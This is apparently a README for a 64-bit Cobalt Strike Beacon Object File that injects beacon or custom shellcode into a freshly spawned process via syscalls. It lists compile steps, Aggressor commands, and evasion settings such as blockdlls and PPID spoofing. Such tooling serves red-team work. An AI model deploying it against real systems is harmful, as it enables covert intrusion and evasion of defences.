## Spawn with Syscalls Shellcode Injection BOF (64-bit only)

Same syscalls injection process as SyscallsInject but uses `BeaconSpawnTemporaryProcess` to create the target process. 

## Compile

```
make
```

## Usage

Aggressor script included with the following commands:
- `syscalls_spawn listener_name` - Injects shellcode for beacon into a spawned process. 
- `syscalls_shspawn path_to_bin` - Injects custom shellcode into a spawned process.

> NOTE: As we're using the beacon API for process spawn, we're not using syscalls, so bear that in mind. Spawning in this way does give us the spawnto, blockdlls and ppid spoofing settings applied though.
